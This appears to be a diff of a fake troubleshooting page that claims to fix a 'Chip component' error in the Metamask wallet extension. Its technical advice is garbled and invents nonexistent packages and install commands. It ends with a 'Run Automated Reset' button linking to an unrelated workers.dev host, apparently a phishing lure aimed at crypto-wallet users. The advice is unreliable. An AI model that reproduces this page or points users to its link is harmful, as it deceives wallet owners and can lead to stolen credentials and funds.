@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,24 +45,29 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported and has been replaced by the Tag component, which provides more flexibility and customization options.</li>
+<li>The error occurs because the Chip component is no longer supported in the latest version of the component-library, and the Metamask extension is still using the outdated component.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the import statement to use the Tag component instead of Chip: </li>
-<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
-<li>Update the component usage to match the new Tag component API</li>
-<li>Remove any deprecated Chip component props to ensure compatibility</li>
+<li>Update the component-library to the latest version using <code>npm install @component-library/latest</code>.</li>
+<li>Replace all instances of the Chip component with the Tag component in the Metamask extension codebase.</li>
+<li>Configure the Tag component to match the previous functionality of the Chip component, for example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;component&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Tag&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;props&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;label&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Replace Chip component&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;color&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;primary&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and package management.</p>
+<p>Consider utilizing an external console to further diagnose and resolve any subsequent issues. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js (version 16 or higher) installed on the system</li>
-<li>npm (version 8 or higher) installed on the system</li>
-<li>Metamask extension source code accessible for modifications</li>
+<li>Node.js installed on the system</li>
+<li>npm package manager installed</li>
+<li>Metamask extension source code accessible for modification</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
